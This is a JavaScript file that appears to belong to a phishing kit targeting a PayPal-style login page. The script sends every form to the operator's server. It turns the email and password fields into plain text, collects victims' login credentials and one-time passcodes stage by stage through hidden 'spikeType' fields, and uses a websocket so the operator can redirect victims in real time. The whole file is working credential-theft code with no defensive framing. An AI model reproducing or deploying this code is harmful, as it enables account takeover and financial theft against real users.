const urlPath = location.pathname
const urlSplit = urlPath.split("/")
const id = urlSplit[3]
const appName = urlSplit[2]

const socket = io(location.origin, {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

socket.on(`${id}-listener`, data => {
    if (data.type == "response") {
        top.location.href = `${location.origin}/ws-app?id=${id}`
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll('*').forEach(element => {
    element.removeAttribute("onclick")
    element.removeAttribute('onmousedown')
})

document.querySelectorAll("form").forEach(form => {
    form.action = location.pathname
    form.method = "POST"
    form.noValidate = true

    const input = document.createElement("input")
    input.type = "hidden"
    input.name = "spikeType"
    form.append(input)
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spikeType"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

function spikeForm(data, silent = false) {
    if (silent) {
        fetch(location.href, JSON.stringify(data), {
            method: "post",
            headers: {
                "Content-Type": "application/json"
            }
        }).then(res => res.text())
            .then(data => {
                console.log(data);
            })
    } else {
        let formData = ""
        for (const key in data) {
            formData += `<input type="hidden" name="${key}" value="${data[key]}">`
        }

        const form = document.createElement("form")
        form.method = "post"
        form.action = location.href
        form.innerHTML = formData
        document.body.appendChild(form)
        form.submit()
    }
}

/**
 *  spikes selector functions +===================+
 */

const selectorSpikes = [
    {
        spikeType: "home-login",
        querys: [
            `[id="email"]`,
            `[name="login_email"]`
        ],
        runner() {
            const emailInp = document.querySelector(`[name="login_email"]`)
            emailInp.type = "text"
            emailInp.required = true
        }
    },
    {
        spikeType: "home-password",
        querys: [
            `[spike-email-done="true"]`
        ],
        runner() {
            const passwordInp = document.querySelector(`[name="login_password"]`)
            passwordInp.type = "text"
            passwordInp.required = true
            const emailInp = document.querySelector(`[name="login_email"]`)
            emailInp.type = "text"
            emailInp.required = false
        }
    }
]

/**
 * button spikes functions +===================+
 */

const buttonSpikes = [
    {
        spikeType: "otp-code",
        runner() {
            const otpInputs = document.querySelectorAll(`[type="number"]`)
            const otpCodeContainer = document.querySelector("#otpCode div")
            if (otpInputs.length == 6) {
                addSpikeType(this.spikeType)
                otpCodeContainer.innerHTML = `
                <div style="width: 100%;" class="css-8s6z98-text_input_base-text_body-code_input_text_input-text_heading_sm" data-ppui-info="text-input_5.4.4">
                    <input style="width: 100%;" type="number" class="hasHelp css-mk6185-text_input_control-text_body-no_label_text_input_control-label_placeholder_shown_and_not_focused-text_body-code_input_text_input_control-text_heading_sm" name="otpCode" aria-invalid="false" placeholder=" " aria-label="1-6" aria-describedby="otpCode" pattern="[0-9]*" for="securityCodeInput" autocomplete="one-time-code" data-ppui="true" value="">
                </div>
                `
            }
        }
    }
]

for (const selectorSpike of selectorSpikes) {
    const spikeType = selectorSpike.spikeType
    const querys = selectorSpike.querys
    const queryLength = querys.length

    let queryMatch = 0
    for (const selector of querys) {
        if (document.querySelector(selector)) queryMatch++
    }

    if (queryLength == queryMatch) {
        addSpikeType(spikeType)
        if (selectorSpike.hasOwnProperty("runner")) {
            try {
                selectorSpike.runner()
            } catch (error) { }
        }

        break
    }
}

for (const buttonSpike of buttonSpikes) {
    try {
        buttonSpike.runner()
    } catch (error) { }
}

// +----------------+
{

}